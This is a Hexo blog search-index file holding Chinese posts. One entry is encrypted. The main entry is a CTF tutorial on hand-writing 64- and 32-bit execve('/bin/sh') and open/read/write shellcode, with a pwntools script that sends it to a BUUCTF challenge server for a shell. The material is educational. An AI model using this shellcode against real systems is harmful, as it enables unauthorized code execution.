<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>预测urandom的输出</title>
      <link href="/posts/81a94eee.html"/>
      <url>/posts/81a94eee.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c26eb6ded830be248fd829a28a5e0e87c1a6c0968be2605730c6d53879ce45cd">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a401e613038619dbf66d848ad22bd4a7df73fae2f2c34aef9c0faea23d6f111b4829bf09a0418e4fc7f7829c4df3cbd4f730aa52dd864485c65130674aab181a3a54d882828d372ddb1cc2c3bee07a33110a3dc4eb66716af8c57888c76ebb65687f1a35941111933ef48a40d270164d4fe3f224f5b950f0b8f6a97fa05a03cf7340a056e0250d6adee8fb9fb9dcd3067c842054a65ec8da5f94285a456ee61684836f321e3761e43876a7cffa5b59f831f302015958c0c265fed6d2506f8f04cb6ae8cb7f8cca6d5427e1d9f6a49426e93f2d3f1f44c89b0759e40a720248567d5de5a356d58cc302cce59b0c50af3fb1774e138346131e1c9059caa32470f01f8de6ed5ccbb6440c9ca91aeeddf5c8695981082c9beb62e821790f748cecec8b9e0bd8e31a32e8302383ce9b8a8c7b332ccb16ca3e832119717ca617ba39ec4475366184aa8620df855c107e0b77a1c446db7cf644538ffc4af812c688b5778f7c60a8499b6aa1da5279122a1e4066f24abef02c4700fa0a02ccffc250b95c5954693001706de229d8b0efd4eb5f7f4e6b3157159a6195a87bc67f5fa2b5ebcff6c80281b6e8cce603283b40234d8f3b23d3aa12872e379a54edb3bb4e0bf2a962af23ce536381db2471beb656b0cc53f8deae7da2f9158cd1e1e22b708aecb391c8da5d53a84a89b3b248bdcf3a88a3c1814f6e1c4051ee61987c411f7c53493aaec7d623e3a756f1323a1197a3fa4d9c52f1a88a32ddf618c57e5d59710163baeae6ad0b15da9208e97b853552012d07392c2c9c514568c5cf46ea1fd7442f380f58565656201e745bb21b6d34a3fb540f28223a8c4c501e91074818989ba1d9a04ab6a9564b9f0fef034cd25952fcb1e9ecc9c5a73ac4d8bee88efa8a1cbcbfc40dc7aa3790ce2e866fd1daa6be31ed8eab49e627294aad5f753428a01c288f541b1c5445e9de32a20aa19a8d9dd7dd6a8f5520e0db794cd13d681687a0f0c5fed0f16518b2bb277f18889af50400c418e9f45f76a577242e934056c0c3b3be0ad295de24890bf8ef5d0e995306dd4b0630d15b1cdaff8f220a8da5801fcdc257af59062e69c86814675344a8dfdba77ad0eef08ce91d0af9c77807e611edf64ed3bf7ec1d026bb2da1a828664a4557d5f043eab81f7c9d84247031b8f5d749d12ab4eceab9afa02a26279d21d293b3daa898064fd3ec17acb56311772c0ed46692208e4d3be6b2cad003280383f6524b82fb0c913454eded4044fee929c9bbdd6e8b16e54277988454b6efa6ad9f40fe97dfa005e8c624d57c53c48ea91ee34f843a7e93c14cdbefa400199f5e96c2334d5d622c552bbe4e047a26923bf01032eb688d6322f55c180c66f50e5418e18764f158feb1bd6d21b1bcaad5be6f55302db3d748ae140d4a959674ebb0d1cf5256e5bd59e72f1cae5a39b1eceec56e66fb9127c878f99e5d82ec11d1b12211e091d2ff1aa24fa2fa27768a65b0503d4de48ef770c8ee2ee36d99b5b1e74309720162b9b4092d02794345ef3862ba438354cc0c7591040ab99bd7c491427788dfe8abeb520a13e6af6c6f5b11205749bfea03dcb07e31775f373e133539dc07844fb1c0b4584b38ef4da41ed46c0b10e5271333fa7343b569a89b345b91a8f8c95438bf0a0fbd694a9ac4e32cfbe802657923bd8828eea8b637007c6b591d9d0fa32a1c36f956c37b62824dbc8391ab4b9ae91521e47f0dc56fca45a21efdaa54d149fb394fd2a948db44f12f9bc3b93e0c096b414381d7993ef3d10fa398bd90692ecb170b776c6d4f9a1a0ba56739532c1cd38383fe130cb0fbff0ca2a3ad13db00e08cfd26ac50c3a60f5b2ad68672bac843e7b19d0b5a44d638d11c742020d25429868f548f3c9d27282f27a51380d7035db083a319cf2b702881cc4ad5f90379dafb60ef70b9c660f1f8ad13d9d42cf6e84b8710c4cb8131a8b013e5f8d5f32b2cb70e3f00c0618eec7a98f5b0993efeb47d31aa14c754636dbfa15f898859aad53ef05d79eb90344de6c7f4a709985dbc0881f576eb9dbf6427f5f156b2c73f50867188c1ce6fa92f78ce07d8ce59df1cfc8b21bbd946452e947fcaf9fc4c4c0c068eddb11a033d5408bd093a407b3f63e83594a095f72343661242d9841e56dde12c92b6117c4890d2694856bb7fc497bf8c0800b6ab959c8b3c2366e1b396f4f259ad546ab66632fcf9f415f10f27ab0a06b63a1f3f7083c55b8e23c41112a4b6cd6ea69185f8e5e0092b17af0bdce27dace5926693a144e4d4704d3f741895aca8a8a7e43d89cc2d13bef0058c4590f859b639b2018f227781f892eefc909b8d2e263c7bb047600533e75fb42965824033da826b8574c5cab964c32bf9d6ae54803326491c8cbb4bfebe7f3bd9aaf7689e147f8ece0efe335d02152e304c0179592a1ef190a11865683c7dd229e13c336770e063cb38e9e98e0c1986fa97b2ca0f0d7cfad1575b9fa55662e68af0c96472d3ea316bbc422cab4326e8cfe04bebb7c60d4722f5d22053f8c828875fe0fdb9b64719dbc5218604c06b82f887184d95d38c9d8f357197cc57642cb79718eb9f045a65cb34767d238ef57177830599a2f680863b24b55a49f2c0fd49f96d33ff8068bbd9ae57ff10a934d5f0a2242081d3bf4fb4984316f5311144a325689be4d36df1c2cf199adba6399c3f74aed831be93e2d628e01ba20d024414d2dfefa874575c5d0e311107c6ef268840bc0694862e97836ea8194e910afe6ac2cdc6173157e201649f5c44dd968bd1ae6a51d2fadf2fecd8d056cd5c40bb56e56b2158700b2e3172a566256a1f7857c9e1a81751b905d0b07a3916a9ec09e64b939f3b04ce5f4f7249733026437997ed7f11cc27b83206e94b74af946dd1a6d66ab2773f7dfe3a6995c3d6c1fd03553032c2368dc5aeae92069f4ca80f25b5eb14e481caa511a148335960a8dde2501abe9fe8770b518ed8d14cb1f4aab77beafd31833c0be46538d7c94682ff163b82dfccb3913139bcff51ffa3f28e0189aa239063a87615d2454b8cb8ca8e92f8d0234226d1400ba1c58261bf5f74fad1e5e91acd995fb40d16a79bb658c6d95d8b1cb1100850b7dd8e2c025ad9ccee81d89a5b9cb3d03c3a90b8df272ed055496463b1eec4a946f92d916f36582aa9776f732d8bddf7277f485bdaf4777b1fe56118b7e99adbb1e5a3e6949ecaf323e6b3464b5e487371621f1e82c6ba9886cc41dcb9a05d2b578897cbd0b198f85bf5d1b239dc2f16ce53e0fa7781be127b7ee49ab9b37426d67d68dff07c532b7d544e55a2730b618a24cfc7c30ad67da0dca00cbbd9cbbf38154472707893a00ddf25e7f9b4030c87db9aeb925f9763974e73e8a4708932f14388db4602ade258a251a77b14299ce1c304c9f2f783abad115d2fa2810fb76618a99c3aaa6089a3cfe9bd7e48c1efcf60345450f16492a7e0b670fe3f1b24edfca3990d6c666a3137212dcfa4d14121a3366dc552f6eeb2aed9cfb4d7bd38191cd8afbba72a6f73fc73747bb74777fa67f04b4d6945faa2ab486698f55f280ae938a88eb890a4ba66ff66353c94f7cd7cb6e7fe15029b11a6bd287e6837cbf8a06768a83ab5b1ca78adfb1992ef19a6782c495e058eea46cca674305c70ddc7d8650453fa14e2809eae4893516164e0d09432e333c1948d3f2662095016a439943bcd7c06b4373024663a9d3060f4070c61ae0bb0964199123d0384381ca9a27fcad40f641f2a64862485917aab5df6bae45aa52acd950d2753dabeeba873ab532a7ef1e2467a8216ff25d731dfa8465faacd82e2715f94dcbeba0caf58405d00a09ea835ca59775095d6eef12a51189d99170635dbe8282ac02bbeb6e9e32f4f2243bebfeca01e88a65b7281aa46cfcaff72c5c6041afe506687df511fb3908171df8cd60448c6f699a3edf4279de1241e1b8b62a2f1f51fd7eb754b58e8724b02d1253dae35ee96f0c0821ee2a3ae9100173beeb4a07971d19042c0a9d80eda59b493e211923be9b601e679bd4d58d47036986ff60c6289d4da5b05040ac53c391bcb2c216190e5f55ab92bce304c02ddba8293076bdd9ba86dc6ea00f12a8e5b545a426ea0fc25b5f3309c836d4fb0deb66d3637f6cee5a9c43ba1904cc04fbbf1a45accf831c9d26d8f2985257c9301093c1a0cfef8cb8f2493d870c2404e4602e9031ca8a449cda53e4ec8349263fb8ef82c1655ebedbcf6e18f123a183f98ef513d365ad66502c0a75659242d42f7c1b0e8bed22de8dfc3bcc0e47f2fb28c2d5aa16cc7219095e4f44733546bc42389f7b563d0efa639a51efe94877a5f048a578f165b68bfd682764ea75c229c30f2bc038a84f50ad7e3d79ce4ec11ba9e3ea42282a03fed0eaa543e9b454c354a17457f414c517058b7f830ac969e6a03f6abb54471de4b743e1694eceb16bcf050d2d352d0e23f3b46a304ad41511b2294426c59c1f3ce4c899e0d949e14b2eaafe91660df2efa16afd0758756c4a97fbd671e88e7e4635e84b3ecd1d495ef86154991f3eaf93d6ae29c81921d90b4d967235394e71aba86711a41d01c0db896675efe720d858902377de7c927724b572c1eb314b1ce5d2441631cc2e5c4e8c0a2ba2e1f4e7f61be3ad7f19d643b07854c3cd15cd4b2362dfe8807e7a0f09aaede07511ac9b59cf60fa00a849d549df1a66babb8e05b0cd6b67894bfbb8ee807667d636197f3aff6f8b0ed2ce2ee78af7dba69ff7f8446a3b38bd182dc211f523ca7fa5dc1866a6accad83d01a477d2d7d8ff640e79aae4b4a7e7fca8f670bd441777007b4d2b05a3893f9f48044bda96ba21e7a1939d3abc9dbb6fd61ee22059505941753908545edec198524127c569681df4c544d14bdebc778bb06bb1369fdd3864a3b08958404ad3db3332b0578792c0c5a3e4224e52f1b994ea67c0f5b34ae3f69b3de0255af045beb64fb2f2f2d29352a60a5903dd232e9a6b26a2354942d35971dacf041b44d171ede11e92b2b66474945569d9e4979615239d9bec3a388ba84dd4013d69763ab1c1eff740bd27fbe9a537487bee0254a4bd178bfffb94f89d7d271e8e12df69413ba3b62b315b49a179c40386577dc901dec29661e3b7881b6f7729fa893535ea03a4fee67fd898785c45a81df55765af652686f730904a5fcedbb493192fb3bf2536420b05b89f4cf80c9bd5161a83d5f0841b2bb369dccaa878e6f380f83571fbb7ded9b456d80e8cff93f9a9ac1e584a938ee6484af737574db3dd6a19b49a93516d4f29c9d6d0c771884d7846169fd904b799eb1805f3fd4e2af1ea48fce6867032b4652bd994b39cf984ea814959f401724121c215f96adcdb824a85dd1a2a5bbf603294d943581ed6a5b496a967e9a78fbc8695181f25aa81bf136bf1ec5d7c20c01512bc48486d7262405069f49f3a84d8cae3a9450502ea45b64dca084c48b71c0aaf5d512c5f17cfb40f22b97c86d6736d8963b8444c2754b8a110f0c782a23b7ae5c397aff0f1786a6d3a2aaed8136e5125235ae700c62ce5f35957e8d96a4308289e31744da37237002d477d270fac408cdd008485dbd3ee9c400bf52b5605ccad37ca9694902d9afeae6213fea7df1e4bd23626fe0311efff2078b1ecbc6cddb38fb3fb8f8ea17a1caace34ad21b4754873b9db0d98b8b790cfbb683783495be829a79352cfd2e17d094d5d71064b3e7f67fe77db36f1d2eb88f8b3fe247f4a39aa048e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> urandom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用汇编语言构造简单的shellcode（64位&amp;&amp;32位）以及将汇编语言转换成机器码的方法</title>
      <link href="/posts/5062ac9d.html"/>
      <url>/posts/5062ac9d.html</url>
      
        <content type="html"><![CDATA[<h1>1、什么是shellcode</h1><p>这里我谈谈自己的理解，shellcode就是一段可执行的机器码，如果可以让CPU从shellcode首字节开始往下执行，那么shellcode执行完毕就会达到编写者想要的目的（shellcode不一定非要是获取shell的机器码），至少初学者先这么理解应该是没什么问题的。</p><h1>2、怎么用汇编语言构造简单的shellcode(64位)</h1><p>前置知识：</p><p>① 64位寄存器传参的前三个寄存器分别是rdi,rsi,rdx</p><p>②64位系统调用号通过查看linux上的/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件就可以获取</p><p>③系统调用号放入rax寄存器，然后syscall就可以执行对应的系统调用函数</p><p>​</p><blockquote><p>首先我们的<strong>目的是执行execve(“/bin/sh”,0,0)</strong> 从而获取shell</p><p>因此，我们需要干三件事情</p><p>①因为程序本来是没有这个execve函数的，但是我们现在要凭空给它造一个，因此这里系统调用execve（你可以理解为，执行syscall指令之前将rax装成对应的系统调用号，就可以执行对应的系统调用。</p><p>②将第一个参数存入&quot;/bin/sh&quot;</p><p>③将第二个、第三个参.数存入0</p></blockquote><p><strong>我们要做的是在系统调用execve之前，去把需要的参数都存进去。</strong></p><p>xor rdx,rdx</p><p>xor rsi,rsi  #此时去把rsi，rdx两个寄存器都存成0，至于这里为什么不用mov rdx,0和mov rsi,0。</p><p>主要是避免出现00字符来截断，不过话说，据我了解，平常如果是直接读入字符串的话，00也不会产生截断的效果，只有用strcpy这类函数的时候，才考虑00截断。不过那为什么我们平常写shellcode还是要尽量选择xor rsi,rsi而不是mov rsi,0呢，是因为xor rsi,rsi所需要的字节数更少。</p><p>这个具体截断的话，可以参考如下两张图片<br><img src="../img/aImdexjb53GTHuP.png" alt=""></p><p><img src="../img/ieYVwvDbsuX9qLk.png" alt=""></p><p>图片出自<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/">CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p>接着是准备要把第一个参数存入rdi，以前我一直以为是rdi的写成/bin/sh对应的ascii码，可是现在才明白，<font color=red>我们只是要把/bin/sh对应的ascii码的*<u><strong>地址</strong></u>*给rdi即可</font>  传参的时候，要调用的函数会自己去这个地址里找到对应的/bin/sh。</p><p>因此这步要写成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f2f6e69622f  #现在rdi的值是0x68732f2f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中</span><br><span class="line"></span><br><span class="line">lea rdi,[rsp]     #等同于mov rdi,rsp  此时是把**栈顶的地址**&lt;u&gt;*（**一定要注意，是栈顶的地址，就是rsp本身的值（rsp本身就是个地址）***&lt;/u&gt;，赋值给rdi，也就是说此时rdi的值就是参数的地址</span><br></pre></td></tr></table></figure><p>这里我还是想详细说一下，因为当初我在这里迷了很久。<font color=red>rsp的值和rsp的内容是两码事</font>，你<strong>可以把他们理解成c语言中的指针p和*p的关系</strong>。<u>rsp的值，就是栈顶内存单元的地址；rsp的内容，就是栈顶的内存单元中的内容。此时rsp的内容才是0x68732f2f6e69622f，而现在只是把栈顶的地址赋给了rdi的值</u>。</p><p>现在也才是我们要的效果，<font color=red>rdi里面装的是/bin//sh的地址，而非参数本身</font>。</p><p>这里有两点需要注意：</p><p>①这个0x68732f2f6e69622f是/bin//sh对应的ascii码。<strong>并且他是倒着存的</strong>，因为asm在把我们写的<strong>汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来</strong>。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数/bin//sh，而非hs//nib/</u>。</p><p>②<strong>0x68732f2f6e69622f中间这里出现了两2f(也就是两个/)，因为这里要填充够八个字节（64位程序中，一个内存单元就只能装八个字节）</strong></p><p>为了达到上述的效果，我们还可以这么写。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line"></span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line"></span><br><span class="line">push rdi</span><br><span class="line"></span><br><span class="line">push rsp</span><br><span class="line"></span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>有好几处内容都变了。</p><p>首先是原本xor rdi,rdi下面的push rdi没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个00来去截断字符串，但是此刻你还会发现0x68732f6e69622f中间的两个2f现在就变成了一个2f（此时参数是/bin/sh） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font></p><p><strong>因此我们不但不需要push一个0，并且还不用去填充八字节，程序帮我们补的00，正好可以去代替原本应该push的0。（值得一提的是如果我们内存单元只有六个字节，那么程序依然会帮我们补全到八个字节，也就是填充两个字节的00）</strong></p><p>最后的变化就是把原本的lea rdi,[rsp]换成了一个push rsp ;pop rdi**（把rsp的值压入栈顶，也就是把rsp的值存入了栈顶内存单元的内容中，再把栈顶的内存单元的内容弹给rdi的值，也就完成了把rsp的值赋给了rdi的值）<strong><u></strong>（在这里一定要区分清楚值与内容的关系）**</u>这样做的好处是什么？这样写的字节更少，原本lea rdi,[rsp]是四个字节<br><img src="../img/n5Jma4K2OYQ7BXS.png" alt=""></p><p>即使换成mov rdi,rsp<br><img src="../img/w4jVgyLbMYJsPnQ.png" alt=""></p><p>也还是三个字节。但是我们为了达到同样的效果，使用push rsp;pop rdi两个指令，一共也才两个字节。<br><img src="../img/LNjIfuTtpRzWJYc.png" alt=""></p><p>因为很多有难度的题目都会限制shellcode的长度，<em>因此我们所选的shellcode，是越短越好。</em></p><p>最后，就是将execve对应的系统调用号放入rax中，然后syscall即可</p><p>那剩下的汇编就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line"></span><br><span class="line">mov rax,0x3b</span><br><span class="line"></span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了0x1e个字节。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="../img/TNoUnRDAEt1FYai.png" alt=""></p><p>此时只要执行这个shellcode，就可以去拿到shell了。</p><p><strong>注意:</strong> 由于压入参数/bin/sh的时候最后一个默认补了00，导致碰见memcpy等函数shellcode会被截断，这里可以用/bin//sh来代替，更新过的shellcode如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f2f6e69622f</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push rsi</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这里拿一道BUUCTF上的mrctf2020_shellcode来演示一下</p><p>使用IDA分析之后（这道题无法F5，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们64位汇编编写shellcode的能力。利用pwntools中的asm把刚才写好的汇编内容转换成机器码，然后发送过去即可获取shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>3、怎么用汇编语言构造简单的shellcode（32位）</h1><p>前置知识：</p><p>①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80</p><p>②我们传参的前三个寄存器分别是ebx,ecx,edx</p><p>③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件/usr/include/x86_64-linux-gnu/asm/unistd_32.h</p><p>然后剩下的思路是和64位汇编构造shellcode的思路是一样的。</p><p>首先是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br></pre></td></tr></table></figure><p>清空两个参数为0的寄存器</p><p>然后是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br></pre></td></tr></table></figure><p>此时把参数/bin/sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是/bin/sh的地址。</p><p><img src="../img/HwopUbyABF6SDzc.png" alt=""></p><p>此时栈中的情况就是这样，/bin/sh与/bin//sh的效果一样，至于为什么要存入字符串的时候，要反着写，在64位汇编编写shellcode的时候，已经解释过了，这里就不再重复。</p><p>最后是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>现在是把系统调用号存进去并且进行了系统调用</p><p>最后把这三部分结合一下效果如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h1>4、手写open，read，write的shellcode</h1><p>遇见pwn题开启了沙箱保护的话，如果禁用了execve、system函数，但没有开启NX保护的话，可以采用orw的方式来读出flag。</p><p>首先我们要执行的如下的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure><p>接下来，就开始用汇编来实现上面的内容(先写64位的)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，</span><br><span class="line">#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个栈地址具体是多少</span><br><span class="line">#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址具体是什么并不重要（只要不会导致堆栈崩溃的话）</span><br><span class="line">#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的</span><br><span class="line">#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来是32位的，32位和64位编写的区别主要是<strong>寄存器不同</strong>和<strong>系统调用号不同</strong>，另外就是<strong>再压入参数’flag’的时候，32位的需要提前压入00用来截断字符串</strong>（64位不需要push 0的原因是存入的’flag’不足8字节，会自动添加00来截断）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0</span><br><span class="line">push 0x67616c66</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">push 5</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push eax</span><br><span class="line">pop ebx</span><br><span class="line">push esp </span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 3</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br><span class="line">push 1</span><br><span class="line">pop ebx</span><br><span class="line">push esp</span><br><span class="line">pop ecx</span><br><span class="line">push 0x50</span><br><span class="line">pop edx</span><br><span class="line">push 4</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h1>5、如何调试或测试写好的汇编代码？</h1><p>因为在编写shellcode的时候，并不是一帆风顺的，如果出现了错误只靠眼睛看的话效果不大，因此我们可以把汇编代码编译为可执行文件，用gdb来调试。</p><p>先用touch shellcode.asm  命令创建一个shellcode.asm文件(asm文件是使用汇编语言编写的源代码文件)</p><p>然后vim shellcode.asm  去编辑这个文件</p><p>将汇编的内容写入这个文件里面。</p><p>（同时在文件的开头写上下面三行的内容，其作用可以自行参考<a href="https://www.cnblogs.com/lazypigwhy/articles/14112041.html">【转】linux汇编.section .text .data 与.global - 比较懒 - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br></pre></td></tr></table></figure><p>最后的写入的内容应该是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后用nasm -f elf64 shellcode.asm这个命令去编译刚才写的那个文件（会生成一个.o文件）</p><p>然后可以用 objdump -d shellcode.o （直接查看的话，是看的AT&amp;T语法的汇编，如果想看intel语法的话加上-M intel参数即可</p><p><img src="../img/HOilK7ZeAynEY5m.png" alt=""></p><p>此时就获取到了汇编指令的机器码。</p><p>不过由于目前生成的仅仅是.o文件，没有被链接过，还无法执行或者调试。因此我们需要链接一下。</p><p>输入命令ld -s -o shellcode shellcode.o 即可</p><p>此时执行生成的shellcode就成功了（如下图）</p><p><img src="../img/wX7aQLldJvpA6xU.png" alt="image-20220607171010492"></p><p>如果想调试的话，直接gdb挂上，然后start就可以开始调试我们写的shellcode了（如下图）</p><p><img src="../img/LKn97vORyN8bX1j.png" alt="image-20220607171241208"><br><strong>补充：推荐一个在线汇编指令转机器码的网站  <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">here</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅尝拟态防御</title>
